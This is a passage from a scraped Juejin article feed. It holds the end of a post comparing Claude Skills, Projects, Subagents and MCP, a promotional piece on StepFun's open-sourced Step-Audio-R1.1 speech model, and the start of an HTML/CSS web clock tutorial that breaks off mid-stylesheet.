<table><thead><tr><th>工具</th><th>提供内容</th><th>持久性</th><th>载入方式</th><th>是否包含代码</th><th>最适合</th></tr></thead><tbody><tr><td><strong>Skills</strong></td><td>Procedural knowledge</td><td>跨对话</td><td>Dynamic</td><td>是</td><td>专业任务</td></tr><tr><td><strong>Prompts</strong></td><td>Moment-to-moment 指令</td><td>单次对话</td><td>每轮</td><td>否</td><td>快速请求</td></tr><tr><td><strong>Projects</strong></td><td>Background context</td><td>Project 内</td><td>始终可用</td><td>否</td><td>持久上下文</td></tr><tr><td><strong>Subagents</strong></td><td>Task delegation</td><td>跨 session</td><td>调用时</td><td>是</td><td>专用任务</td></tr><tr><td><strong>MCP</strong></td><td>Tool connectivity</td><td>Continuous</td><td>始终可用</td><td>是</td><td>数据接入</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">常见组合与示例</h2>
<p>不同工具组合使用可以让工作流更加强大。例如：</p>
<p><strong>研究 agent 工作流</strong></p>
<ol>
<li>建立一个 <strong>Project</strong> 来包含所有产品市场分析、竞争对手资料等；</li>
<li>用 <strong>MCP</strong> 连接外部数据源（如 Google Drive / GitHub）；</li>
<li>创建一个 “competitive-analysis” <strong>Skill</strong> 作为分析框架；</li>
<li>使用多个 <strong>subagents</strong> （如 <code>market-researcher</code>、<code>technical-analyst</code>）处理各自专精领域；</li>
<li>最后通过 <strong>prompts</strong> 进一步调整和细化输出。</li>
</ol>
<h2 data-id="heading-8">from</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.claude.com%2Fblog%2Fskills-explained" target="_blank" title="https://www.claude.com/blog/skills-explained" ref="nofollow noopener noreferrer">www.claude.com/blog/skills…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[语音模型变天！阶跃星辰R1.1开源，96.4%胜率让GPT都沉默]]></title>    <link>https://juejin.cn/post/7595423675458600998</link>    <guid>https://juejin.cn/post/7595423675458600998</guid>    <pubDate>2026-01-15T12:36:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423675458600998" data-draft-id="7595423675458584614" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="语音模型变天！阶跃星辰R1.1开源，96.4%胜率让GPT都沉默"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-15T12:36:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            语音模型变天！阶跃星辰R1.1开源，96.4%胜率让GPT都沉默
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:36:44.000Z" title="Thu Jan 15 2026 12:36:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是你们的老朋友。今天我们要聊的事情，可能真的标志着AI语音交互的一个分水岭。</p>
<p>长久以来，我们对语音助手的印象大概还停留在“听写员”的阶段。你说话，它转成文字，然后用文字大模型处理，最后再读出答案。这个过程最大的问题是什么？是丢失了灵魂。你语气里的无奈、急促，甚至背景里的环境音，在这个转化过程中统统被过滤掉了。</p>
<p>但就在2026年1月，一家来自上海的创业公司——阶跃星辰（StepFun），用他们的新模型 <strong>Step-Audio-R1.1</strong> 给整个行业上了一课。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasfdsfs-1024x457.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asfdsfs-1024x457.webp" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/047dc642231f4685b4d61b41bf55ec15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085404&amp;x-signature=QUFextPmrjmC7eA7vCu2eXRaPAM%3D" alt="asfdsfs" loading="lazy"/></a></p>
<p><strong>这一战，赢得漂亮</strong></p>
<p>这不是我的一家之言，数据摆在那儿。</p>
<p>在全球权威的 Artificial Analysis Speech Reasoning 评测中，Step-Audio-R1.1 拿下了 <strong>96.4%</strong> 的准确率。这个数字意味着什么？意味着它直接登顶榜首，把大名鼎鼎的 Grok、Google 的 Gemini，甚至是 OpenAI 的 GPT-Realtime 都甩在了身后。</p>
<p>要知道，这可是一个专门针对原生语音推理的“魔鬼考场”，它不考你的听写速度，考的是你能不能像人一样，直接通过声音去思考。</p>
<p><strong>它凭什么这么强？</strong></p>
<p>Step-Audio-R1.1 的核心逻辑，在于它抛弃了传统的“二传手”模式。</p>
<p>以前的模型是“耳朵听见 -&gt; 脑子翻译成字 -&gt; 再思考”，而 Step-Audio-R1.1 是<strong>原生音频模型（Native Audio Model）</strong>。简单说，它拥有了直觉。它不需要把声音变成干巴巴的文字，而是直接处理音频信号。</p>
<p>这里有个很有意思的技术概念，叫做“模态锚定推理蒸馏”。听着挺拗口，其实道理很性感：它让AI在推理时，不仅仅基于字面意思，而是死死“锚定”在声音的物理特征上。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-15_20.29.21-1024x591.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-15_20.29.21-1024x591.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/335ef41dd5d549e08c42f797b528b10d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085404&amp;x-signature=dCVWLnCcrGT7vGl3xGovkR%2FJUTU%3D" alt="iShot_2026-01-15_20.29.21" loading="lazy"/></a></p>
<p>举个生动的例子：如果背景里放着那种魔性的“海豹舞”音乐，普通AI可能只会识别出里面的韩语歌词；但 Step-Audio-R1.1 能听出这是在搞怪，甚至判断出这是一种发音练习场景。它能听懂你的笑声是尴尬还是开心，能听懂你的停顿是在思考还是在犹豫。</p>
<p>这就是从“听得清”到“听得懂”的质变。</p>
<p><strong>边听边想，拒绝尴尬沉默</strong></p>
<p>除了聪明，这模型还有一个杀手锏：快。</p>
<p>大家用过语音助手的都知道，你说完话，对面往往要沉默个几秒，空气突然安静。Step-Audio-R1.1 把首包延迟降低了30%以上，做到了“流式推理”。这意味着当你话音未落，它的大脑已经在高速运转组织语言了，就像我们人类聊天一样，话赶话，没有那种令人脚趾扣地的等待感。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fsafsdgfdfg-1024x545.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/safsdgfdfg-1024x545.webp" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aecbb5b567d43ef932333b98e1f4fda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085404&amp;x-signature=t5ZhQXpw90c25ysQ8iQodM%2FQLOw%3D" alt="safsdgfdfg" loading="lazy"/></a></p>
<p><strong>给开发者的一份大礼</strong></p>
<p>最让我兴奋的不是它有多强，而是它<strong>开源</strong>了。</p>
<p>阶跃星辰这次非常大方，直接把模型权重放在了 Hugging Face 和 ModelScope 上。对于我们这些在应用层的开发者来说，这简直是天上掉馅饼。你不需要再去死磕那些昂贵的闭源API，完全可以基于这个地表最强的开源模型，去搭建自己的智能客服、同声传译或者游戏NPC。</p>
<p>而且，据说完整的实时语音API会在2026年2月上线。那时候，集成的门槛会更低。</p>
<p><strong>写在最后</strong></p>
<p>我们常说国产大模型在追赶，但这次，Step-Audio-R1.1 的表现更像是一次弯道超车。它证明了在多模态、尤其是语音推理这个细分赛道上，单纯堆算力不一定是唯一解，架构的创新和对声音本质的理解同样关键。</p>
<p>如果你也是一名开发者，或者对人机交互感兴趣，我强烈建议你去试试这个模型。毕竟，能听懂“弦外之音”的AI，才是我们真正想要的未来。</p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[网页版时钟]]></title>    <link>https://juejin.cn/post/7595413459199016996</link>    <guid>https://juejin.cn/post/7595413459199016996</guid>    <pubDate>2026-01-15T12:45:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595413459199016996" data-draft-id="7595413459198967844" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="网页版时钟"/> <meta itemprop="keywords" content="前端,JavaScript,HTML"/> <meta itemprop="datePublished" content="2026-01-15T12:45:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="rocky191"/> <meta itemprop="url" content="https://juejin.cn/user/993614240163630"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            网页版时钟
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614240163630/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    rocky191
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:45:16.000Z" title="Thu Jan 15 2026 12:45:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>之前看到类似的时钟工具，ai coding 一个类似的！浏览器全屏显示后，当成屏保，也不错。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/618c2033b5994e8a8b5c3911c8831886~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ja3kxOTE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085915&amp;x-signature=80bYvpuwsjr35tXeCA68b9WOV4s%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>数字时钟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        * {
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">box-sizing</span>: border-box;
        }

        <span class="hljs-selector-tag">body</span> {
            <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Arial'</span>, sans-serif;
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffffff</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-direction</span>: column;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
        }

        <span class="hljs-selector-class">.container</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">800px</span>;
        }

        <span class="hljs-selector-class">.date</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.5rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">300</span>;
        }

        <span class="hljs-selector-class">.clock-container</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">60px</span>;
        }

        <span class="hljs-selector-class">.time-segment</span> {
            <span class="hljs-attribute">position</span>: relative;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">80px</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">120px</span>;
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e0e0e0</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">overflow</span>: hidden;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
        }

        <span class="hljs-selector-class">.time-digit</span> {
            <span class="hljs-attribute">position</span>: absolute;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">4rem</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
        }

        <span class="hljs-selector-class">.time-separator</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
        }

        <span class="hljs-selector-class">.ampm</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.5rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
            <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
        }

        <span class="hljs-selector-class">.quote</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.2rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
            <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">font-style</span>: italic;
        }

        <span class="hljs-selector-class">.author</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#888</span>;
            <span class="hljs-attribute">text-align</span>: right;
        }

        <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
            <span class="hljs-selector-class">.date</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
            }

            <span class="hljs-selector-class">.time-segment</span> {
                <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;
                <span class="hljs-attribute">height</span>: <span class="hljs-number">90px</span>;
            }

            <span class="hljs-selector-class">.time-digit</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
            }

            <span class="hljs-selector-class">.time-separator</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.5rem</span>;
            }

            <span class="hljs-selector-class">.ampm</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
            }

            <span class="hljs-selector-class">.quote</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
            }
        }

        <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
            <span class="hljs-selector-class">.date</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
            }

            <span class="hljs-selector-class">.time-segment</span> {
                <span class="hljs-attribute">width</span>: <span class="hljs-number">45px</span>;
                <span class="hljs-attribute">height</span>: <span class="hljs-number">70px</span>;
            }

            <span class="hljs-selector-class">.time-digit</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.2rem</span>;
            }

            <span class="hljs-selector-class">.time-separator</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
            }

            <span class="hljs-selector-class">.ampm</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
            }

            <span class="hljs-selector-class">.quote</span> {
